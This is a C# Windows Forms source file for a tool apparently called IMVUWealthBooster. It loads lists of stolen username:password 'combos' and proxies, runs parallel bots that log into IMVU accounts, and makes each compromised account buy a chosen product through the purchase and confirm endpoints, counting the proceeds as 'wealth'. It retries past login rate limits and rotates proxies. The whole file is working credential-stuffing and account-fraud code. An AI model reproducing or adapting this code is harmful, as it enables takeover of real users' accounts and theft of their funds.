using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ZertLib;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using TrinitySeal;

namespace IMVUWealthBooster
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        static ComboManager ComboManager = new ComboManager();
        static ProxyManager ProxyManager = new ProxyManager();
        static BotManager BotManager = new BotManager(20);

        private delegate void SafeCallDelegate(int amount);
        private delegate void SafeCallSetText(MetroFramework.Controls.MetroLabel label, string text);

        static IMVUProduct IMVUProduct;
        static int total,index,dead,wealth,retries = 0;

        static string apiLogin;
        static string apiLegacyPurchase;
        static string apiLegacyPurchaseConfirm;
        static string apiProductInfo;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            SealCheck.HashChecks();
            if (SealCheck.isValidDLL)
            {
                Security.ChallengeCheck();
                Seal.GrabVariables("YSOjvKtqxIzKwBvEglSSkuEwn", "8S9UDWnRx5fIM0ARbQG8nVHkLSBEjz9ABNbOsP7LZuQ3j");
                apiLogin = Seal.Var("apiLogin");
                apiLegacyPurchase = Seal.Var("apiLegacyPurchase");
                apiLegacyPurchaseConfirm = Seal.Var("apiLegacyPurchaseConfirm");
                apiProductInfo = Seal.Var("apiProductInfo");
            }
        }

        private void LoadCombosBtn_Click(object sender, EventArgs e)
        {
            fileDialog.Title = "Select Combos";
            if (fileDialog.ShowDialog() == DialogResult.OK)
            {
                loadCombosBtn.Text = "Combos: " + ComboManager.LoadFromFile(fileDialog.FileName);
            }
        }

        private void LoadProxiesBtn_Click(object sender, EventArgs e)
        {
            fileDialog.Title = "Select Proxies";
            if (fileDialog.ShowDialog() == DialogResult.OK)
            {
                loadProxiesBtn.Text = "Proxies: " + ProxyManager.LoadFromFile(fileDialog.FileName);
            }
        }

        private void ProxyTypeComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            ProxyManager.SetProxyType((ProxyType)proxyTypeComboBox.SelectedIndex);
        }

        private void SetLabelTextSafe(MetroFramework.Controls.MetroLabel label, string text)
        {
            if (label.InvokeRequired)
            {
                var d = new SafeCallSetText(SetLabelTextSafe);
                Invoke(d, new object[]
                {
                    label, text
                });
            } else
            {
                label.Text=text;
            }
        }

        // https://api.imvu.com/product/product-43809468
        private void SelectItemMetroBox_Click(object sender, EventArgs e)
        {
            HttpRequest req = new HttpRequest();
            req.ManualMode = true;
            try
            {
                var resp = req.Get(string.Format(apiProductInfo, selectItemTextBox.Text)).ToString();
                if (resp.Contains("success"))
                {
                    IMVUProduct = new IMVUProduct();
                    IMVUProduct.Name = resp.SubstringEx("product_name\": \"", ",");
                    var productPrice = resp.SubstringEx("product_price\":", ",");
                    var cats = resp.Substrings("\"id\":", ",");
                    var catStr = "";
                    for (int i = 1; i < cats.Length; i++)
                    {
                        catStr += cats[i] + "-";
                    }
                    catStr = catStr.Substring(0, catStr.Length - 1);
                    itemNameLabel.Text = "Name: " + IMVUProduct.Name;
                    itemPriceLabel.Text = "Price: " + productPrice;
                    IMVUProduct.Price = Int32.Parse(productPrice);
                    IMVUProduct.ID = Int32.Parse(selectItemTextBox.Text);
                    IMVUProduct.CategoryString = catStr;
                } else
                {
                    itemNameLabel.Text = "Name: Invalid ID";
                    itemPriceLabel.Text = "Price: 0";
                    IMVUProduct = null;
                }
            } catch
            {
                itemNameLabel.Text = "Name: ERROR";
                itemPriceLabel.Text = "Price: ERROR";
                IMVUProduct = null;
            }
        }

        private void SafeSetProgress(int amount)
        {
            if (combosProgressBar.InvokeRequired)
            {
                var d = new SafeCallDelegate(SafeSetProgress);
                Invoke(d, new object[] { amount });
            } else
            {
                combosProgressBar.Value = amount;
            }
        }

        private void StartStopBtn_Click(object sender, EventArgs e)
        {
            if (ComboManager.Count() == 0)
            {
                MessageBox.Show("Please load a combo's file first.", "No Combos", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            if (ProxyManager.Count() > 0 && proxyTypeComboBox.SelectedIndex == 0)
            {
                MessageBox.Show("You've loaded proxies, please select which type you are using.", "Proxy issue", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            total = ComboManager.Count();
            if (!BotManager.IsRunning())
            {
                startStopBtn.Text = "Stop";
                Task.Run(() => BotManager.Run(BotFunction, ComboManager.getList().ToArray()));
                Task.Run(() =>
                {
                    while(true)
                    {
                        SetLabelTextSafe(totalWealthLabelValue, wealth.ToString());
                        SetLabelTextSafe(retriesLabelValue, retries.ToString());
                        SetLabelTextSafe(deadAccountsLabelValue, dead.ToString());
                        SafeSetProgress((index/total)*100);
                        System.Threading.Thread.Sleep(500);
                    }
                });
            } else
            {
                BotManager.Stop();
            }
        }

        private void BotFunction(string line, ParallelLoopState Breaker)
        {
            index++;
            dynamic obj = new
            {
                username = line.Split(':')[0],
                password= line.Split(':')[1],
                gdpr_cookie_acceptance= false
            };

            HttpRequest req = new HttpRequest();
            req.ManualMode = true;

        A:
            if (ProxyManager.Count() > 0)
            {
                req.Proxy = ProxyClient.Parse(ProxyManager.GetProxyType(), ProxyManager.GetProxyString());
            }

            string resp;
            try
            {
                resp = req.Post(apiLogin, JObject.FromObject(obj).ToString(), "application/json").ToString();
                Console.WriteLine(resp);
            }
            catch
            {
                retries++;
                goto A;
            }
            if (resp.Contains("success"))
            {
                var sauce = resp.SubstringEx("sauce\":\"", "\",");
                
                dynamic obj2 = new
                {
                    products = IMVUProduct.ID,
                    trackingId = "",
                    sauce = sauce,
                    source = "web",
                    keywords = "",
                    category = IMVUProduct.CategoryString,
                    page_num = 1,
                    sort = "default_sort",
                    sort_order = "default_sort_order",
                    purchase_method = "one_click_buy"
                };
                try
                {
                    /*
                    products: 45900769
                    trackingId: 
                    sauce: 5mi-T-uWW4XUWL8ei6US1WMsptc=
                    source: web
                    keywords: 
                    category: 106-41-69
                    page_num: 1
                    sort: default_sort
                    sort_order: default_sort_order
                    purchase_method: one_click_buy
                     */
                    resp = req.Post(apiLegacyPurchase, JObject.FromObject(obj2).ToString(), "application/json").ToString();
                    Console.WriteLine(resp);
                 }
                catch
                {
                    retries++;
                    goto A;
                }

                if (!resp.Contains("status\":1"))
                {
                    dead++;
                    return;
                }

                dynamic obj3 = new
                {
                    sauce= sauce,
                    preference= "InstantBuyConfirm",
                    value= 1
                };

                try
                {
                    resp = req.Post(apiLegacyPurchaseConfirm, JObject.FromObject(obj3).ToString(), "application/json").ToString();
                    Console.WriteLine(resp);
                }catch
                {
                    retries++;
                    goto A;
                }

                if (!resp.Contains("status\":1"))
                {
                    dead++;
                    return;
                }

                wealth += IMVUProduct.Price;
            }
            else if (resp.Contains("LOGIN-011") || resp.Contains("LOGIN-002"))
            {
                retries++;
                goto A;
            }
            else
            {
                dead++;
            }
        }

        private void BotCountTrackBar_Scroll(object sender, ScrollEventArgs e)
        {
            botCountLabel.Text = "Bots: " + botCountTrackBar.Value;
            BotManager.SetBotCount(botCountTrackBar.Value);
        }
    }

    class IMVUProduct
    {
        public int ID { get; set; }
        public string Name { get; set; }
        public int Price { get; set; }
        public string CategoryString { get; set; }
    }

}
